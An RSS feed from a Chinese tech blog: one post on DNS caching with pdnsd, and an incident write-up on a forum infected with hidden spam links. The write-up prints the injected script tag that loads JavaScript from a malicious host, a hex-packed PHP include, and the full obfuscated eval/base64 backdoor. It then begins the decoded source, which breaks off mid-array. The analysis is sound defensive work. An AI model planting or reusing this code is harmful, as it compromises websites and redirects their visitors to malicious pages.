<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>web - 看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com/tag/web.xml</link>
        <lastBuildDate>Thu, 17 Dec 2015 15:28:53 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>web - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/tag/web.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>技术</category>
        <item>
            <title><![CDATA[使用Pdnsd缓存域名解析结果加快上网速度]]></title>
            <link>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</link>
            <guid>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</guid>
            <pubDate>Tue, 23 Jun 2015 10:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>频繁的域名解析容易导致超时出错

<p>
在执行 <code>opkg-cl update</code> 或 <code>yaourt -Syua</code> 命令更新系统软件信息时，容易因为频繁的域名解析而导致更新速度奇慢甚至是超时出错，通过将要访问的域名添加到 <code>/etc/hosts</code> 中，可以立即解决这个问题。考虑到服务器IP可能会换，使用 <code>/etc/hosts</code> 非长久之计。
</p>
</li>

<li>缓存域名解析结果

<p>
更好的办法是缓存域名解析结果，一般来说后台服务程序可以通过缓存域名解析结果加快后继请求的处理，但是对于像 <code>opkg-cl</code> 、 <code>yaourt</code> 之类的工具程序，由于运行一次就退出了，要实现缓存域名解析结果就显得有点小题大作了，最好是在系统底层来实现，而不是每个应用程序都实现这个功能。
</p>

<p>
<a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 就是这样一款开源DNS代理服务程序，它安装在客户机上，对于客户端应用程序来说，它是DNS服务程序，对于真正的DNS服务来说它是DNS客户端程序。
</p>
</li>

<li><a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 安装

<div class="org-src-container">

<pre class="src src-sh">yaourt -S pdnsd
</pre>
</div>
</li>

<li><a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 运行

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl enable pdnsd
sudo systemctl start pdnsd
</pre>
</div>
</li>

<li>客户机DNS设置

<p>
修改 <code>/etc/resolv.conf</code> 为如下内容：
</p>

<pre class="example">
nameserver 127.0.0.1
</pre>

<p>
对于 Archlinux <code>/etc/resolv.conf</code> 是由 <code>resolvconf</code> 工具生成，直接修改后随时可能被覆盖，可以修改 <code>/etc/resolvconf.conf</code> 将以下配置行取消注释：
</p>
<pre class="example">
# name_servers=127.0.0.1
</pre>

<p>
然后重新生成 <code>/etc/resolv.conf</code> 配置文件：
</p>
<div class="org-src-container">

<pre class="src src-sh">sudo resolvconf -u
</pre>
</div>
</li>

<li>看看效果

<p>
多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是DNS缓存在起作用。
</p>

<div class="org-src-container">

<pre class="src src-sh">nslookup www.google.com
</pre>
</div>
</li>

<li>适合国内环境的配置（仅供参考）

<p>
将 <code>/etc/pdnsd.conf</code> 配置文件修改为以下内容：
</p>

<pre class="example">
global {
    perm_cache=1024;
    cache_dir="/var/cache/pdnsd";
    pid_file = /var/run/pdnsd.pid;
    run_as="pdnsd";
    server_ip = 127.0.0.1;
    status_ctl = on;
    query_method=udp_tcp;
    min_ttl=15m;
    max_ttl=1d;
    timeout=10;
    neg_domain_pol=on;
    udpbufsize=1024;
}

server {
    label = "root-servers";
    root_server = discover;
    randomize_servers = on;
    ip = 114.114.114.114,
         223.5.5.5,
         114.114.115.115,
         223.6.6.6;
    timeout = 5;
    uptest = query;
    interval = 30m;
    ping_timeout = 50;
    purge_cache = off;
    exclude = .localdomain;
    policy = included;
    preset = off;
}

source {
    owner=localhost;
    serve_aliases=on;
    file="/etc/hosts";
}

rr {
    name=localhost;
    reverse=on;
    a=127.0.0.1;
    owner=localhost;
    soa=localhost,root.localhost,42,86400,900,86400,86400;
}
</pre>

<p>
重启 <a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 生效配置：
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl restart pdnsd
</pre>
</div>
</li>

<li>参考

<p>
《<a href="http://venmos-com.qiniudn.com/blog/2013/06/19/pdnsd/">用Pdnsd快速打造无污染高速缓存DNS服务器</a>》</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #e78c45;">div</span> <span style="color: #e7c547;">style</span>='display:none'&gt;&lt;<span style="color: #e78c45;">script</span> <span style="color: #e7c547;">language</span>='javascript' <span style="color: #e7c547;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #e7c547;">&amp;logo</span>=1' <span style="color: #e7c547;">charset</span>='gb2312'&gt;&lt;/<span style="color: #e78c45;">script</span>&gt;&lt;/<span style="color: #e78c45;">div</span>&gt;&lt;<span style="color: #e78c45;">script</span> <span style="color: #e7c547;">type</span>='text/javascript' <span style="color: #e7c547;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #e78c45;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b9ca4a;">INCLUDE</span>(<span style="color: #eaeaea; background-color: #000000;">pack(</span><span style="color: #70c0b1;">'H*'</span>,<span style="color: #70c0b1;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #c397d8;">&lt;?php</span> $<span style="color: #e7c547;">O00OO0</span>=<span style="color: #eaeaea; background-color: #000000;">urldecode(</span><span style="color: #70c0b1;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #70c0b1; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);$</span><span style="color: #e7c547; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">6</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">30</span><span style="text-decoration: underline;">};$</span><span style="color: #e7c547; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">24</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #e7c547; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=$</span><span style="color: #e7c547; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">18</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #e7c547; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">7</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">13</span><span style="text-decoration: underline;">};$</span><span style="color: #e7c547; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">22</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">36</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">29</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">30</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">32</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">35</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #e7c547; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">30</span><span style="text-decoration: underline;">};</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">eval(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #70c0b1; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #c397d8;">&lt;?php</span>
<span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; font-style: italic;">*author:whoami</span>
<span style="color: #969896; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #eaeaea; background-color: #000000;">error_reporting(0</span>);
$<span style="color: #e7c547;">fileDir</span> = <span style="color: #70c0b1;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #e7c547;">IP</span>=$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'REMOTE_ADDR'</span>];
$<span style="color: #e7c547;">Bot</span>=$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_USER_AGENT'</span>];
$<span style="color: #e7c547;">Ref</span>=$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_REFERER'</span>];
$<span style="color: #e7c547;">KIP</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'117.28.255.37'</span>,<span style="color: #70c0b1;">'116.55.241.24'</span>,<span style="color: #70c0b1;">'125.64.94.219'</span>,<span style="color: #70c0b1;">'119.147.114.213'</span>,<span style="color: #70c0b1;">'11</span><span style="color: #70c0b1; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: 